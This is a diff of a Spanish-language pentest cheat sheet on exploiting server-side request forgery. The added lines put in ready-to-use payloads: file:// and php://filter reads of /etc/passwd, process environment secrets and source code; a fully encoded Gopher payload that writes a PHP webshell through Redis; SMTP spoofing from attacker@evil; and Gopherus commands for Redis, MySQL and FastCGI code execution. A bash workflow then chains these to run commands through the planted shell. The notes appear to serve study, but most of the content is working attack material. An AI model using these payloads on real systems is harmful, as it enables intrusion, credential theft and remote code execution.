@@ -1,19 +1,19 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/ssrf
   - technique/lateral-movement
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[Server-Side Request Forgery (SSRF)]]"
-  - "[[SSRF - CWES]]"
-  - "[[SSRF - Gopher]]"
-  - "[[Anatomía de la Construcción de un Payload Gopher]]"
+  - '[[Server-Side Request Forgery (SSRF)]]'
+  - '[[SSRF - CWES]]'
+  - '[[SSRF - Gopher]]'
+  - '[[Anatomía de la Construcción de un Payload Gopher]]'
 ---
 # SSRF - Explotación
 
@@ -21,31 +21,71 @@ linked:
 
 ## Cheatsheet
 
-| **Técnica / Objetivo**                      | **Protocolo**           | **Payload / Comando**                                                                                     | **Detalles y Notas**                                                                                                                                                             |
-| ------------------------------------------- | ----------------------- | --------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| <br>**Enumeración de Directorios Internos** | <br><br>`http://`       | <pre><code>ffuf -w wordlist.txt -u URL -d "param=http://interno/FUZZ.php" -fr "Error String"</code></pre> | <br>Utilizar [[ffuf]] para fuerza bruta sobre directorios internos. Es vital usar `-fr` (Filter Regex) para ocultar las respuestas de error estándar del servidor (404/403).     |
-| <br>**Local File Inclusion (LFI)**          | <br><br>`file://`       | <pre><code>file:///etc/passwd</code></pre><pre><code>file:///C:/Windows/win.ini</code></pre>              | <br>Si no hay validación de esquema, permite leer archivos del sistema de archivos local del servidor.                                                                           |
-| <br><br>**Bypass de Método (GET a POST)**   | <br><br><br>`gopher://` | <br><br><pre><code>gopher://<IP>:<PORT>/_POST%20/admin.php...</code></pre><br><br>                        | <br>El protocolo [[Gopher]] permite enviar bytes arbitrarios a un socket TCP. Útil para interactuar con formularios internos que requieren POST cuando el SSRF solo permite GET. |
-| <br>**Interacción con SMTP**                | <br><br>`gopher://`     | <br><pre><code>gopher://127.0.0.1:25/_MAIL%20FROM...</code></pre>                                         | <br>Permite enviar correos electrónicos falsificados desde el `localhost` (puerto 25), a menudo confiable para el servidor de correo interno.<br><br>                            |
-| <br>**Generación de Payloads (Gopherus)**   | <br><br>`Script`        | <br><pre><code>python2.7 gopherus.py --exploit [smtp\|mysql\|redis]</code></pre>                          | <br>Herramienta para automatizar la creación de URLs Gopher complejas. Soporta: [[MySQL]], [[PostgreSQL]], FastCGI, Redis, SMTP, Zabbix.<br><br>                                 |
+| **Payload (param value)** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `file:///etc/passwd` | Lectura de archivos del backend | Wrapper `file://` habilitado. |
+| `file:///C:/Windows/win.ini` | Equivalente Windows | Backend Windows. |
+| `file:///proc/self/environ` | Variables de entorno del proceso (DB_PASSWORD/tokens) | Backend Linux con `/proc` accesible. |
+| `php://filter/convert.base64-encode/resource=index.php` | Source del backend en base64 | PHP con `allow_url_include` u SSRF que entrega body. |
+| `dict://127.0.0.1:11211/stats` | Stats Memcached | libcurl-based backend, Memcached interno. |
+| `gopher://127.0.0.1:6379/_INFO%0d%0a` | Output `INFO` de Redis | Schema gopher soportado, Redis sin auth. |
+| `gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20%22%5Cn%5Cn%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%3F%3E%5Cn%5Cn%22%0d%0aCONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%2F%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSAVE%0d%0a` | Webshell PHP escrita en `/var/www/html/shell.php` via Redis SAVE | RCE clásico Redis-SSRF. |
+| `gopher://127.0.0.1:25/_HELO%20a%0d%0aMAIL%20FROM%3A%3Cattacker@evil%3E%0d%0aRCPT%20TO%3A%3Cvictim@target%3E%0d%0aDATA%0d%0aSubject%3A%20fake%0d%0a%0d%0aPwned%0d%0a.%0d%0a` | Email spoofeado desde loopback | SMTP 25 trust en localhost. |
+| `gopher://TARGET:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0d%0aHost%3A%20TARGET%0d%0aContent-Length%3A%2010%0d%0a%0d%0auser%3Dadmin` | Request POST con body controlado | App con SSRF GET-only, target acepta POST. |
+| `python2.7 gopherus.py --exploit redis` | URL Gopher generada auto para Redis RCE | Generación rápida sin construir a mano. |
+| `python2.7 gopherus.py --exploit mysql --usr root` | Gopher Payload MySQL como root | Backend MySQL trust en localhost. |
+| `python2.7 gopherus.py --exploit fastcgi` | Gopher payload FastCGI → RCE | PHP-FPM bindeado a loopback (9000). |
+| `ffuf -w paths.txt -u http://TARGET/ -d 'dateserver=http://internal-app/FUZZ&date=2024-01-01' -fr 'Failed to connect'` | Path bruteforce contra app interna | Discovery interna post-port-enum. |
 ^ssrf-explotacion
 
-### Consideraciones de Codificación 
-([[Anatomía de la Construcción de un Payload Gopher]])
+### Workflow
 
-Al trabajar con el protocolo **Gopher**, la codificación es crítica para el éxito del exploit:
+```bash
+# 1. LFI vía file://
+curl -X POST http://TARGET/index.php \
+  -d 'dateserver=file:///etc/passwd&date=2024-01-01'
 
-|**Paso**|**Acción**|**Razón**|
-|---|---|---|
-|**1. Estructura Raw**|Crear la petición HTTP/SQL/SMTP tal cual se enviaría por socket.|Gopher envía datos crudos.|
-|**2. URL Encode**|Codificar caracteres especiales, especialmente saltos de línea (`%0D%0A`) y espacios (`%20`).|El formato de URL no soporta espacios ni saltos de línea directos.|
-|**3. Doble URL Encode**|Volver a codificar el payload completo si se pasa como parámetro GET/POST.|El servidor web decodificará el parámetro una vez; el backend que realiza la petición SSRF necesita recibir los caracteres codificados para procesarlos correctamente.|
+# 2. PHP source disclosure
+curl -X POST http://TARGET/index.php \
+  -d 'dateserver=php://filter/convert.base64-encode/resource=admin.php&date=2024-01-01' | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
 
+# 3. Redis RCE via Gopher (con gopherus)
+python2.7 gopherus.py --exploit redis
+# → input: PHP webshell payload + path /var/www/html/shell.php
+# → copy gopher URL output
+PAYLOAD='gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aFLUSHALL%0d%0a...'
+curl -X POST http://TARGET/index.php \
+  --data-urlencode "dateserver=$PAYLOAD" \
+  -d 'date=2024-01-01'
+curl 'http://TARGET/shell.php?0=id'
 
+# 4. Bruteforce de paths internos
+echo -e "admin\nadmin.php\nconfig\nactuator\n.env\nphpinfo.php" > paths.txt
+ffuf -w paths.txt \
+     -u http://TARGET/index.php \
+     -X POST \
+     -d 'dateserver=http://127.0.0.1/FUZZ&date=2024-01-01' \
+     -fr 'Failed to connect\|404'
+```
 
-***
+### Encoding Gopher (gotcha clásico)
 
-## Overview
+Gopher exige **doble URL-encode** cuando el payload pasa por param GET/POST: el server decodifica una vez (HTTP-level) y el backend que abre el socket Gopher decodifica otra vez. Si solo single-encode → CRLF se pierde antes de llegar al socket.
 
+```
+Raw (lo que llega al socket):
+POST /admin.php HTTP/1.1\r\n
+Host: target\r\n
+\r\n
+user=admin
+
+Single-encoded (NO sirve si pasa por param):
+gopher://target:80/_POST%20/admin.php%20HTTP/1.1%0d%0aHost:%20target%0d%0a%0d%0auser=admin
+
+Doble-encoded (sirve):
+gopher://target:80/_POST%2520/admin.php%2520HTTP/1.1%250d%250aHost:%2520target%250d%250a%250d%250auser%253Dadmin
+```
+
+`gopherus.py` ya genera con encoding correcto para CLI directo; si lo metés en burp/form-data, agregar encode extra.
 
 ***
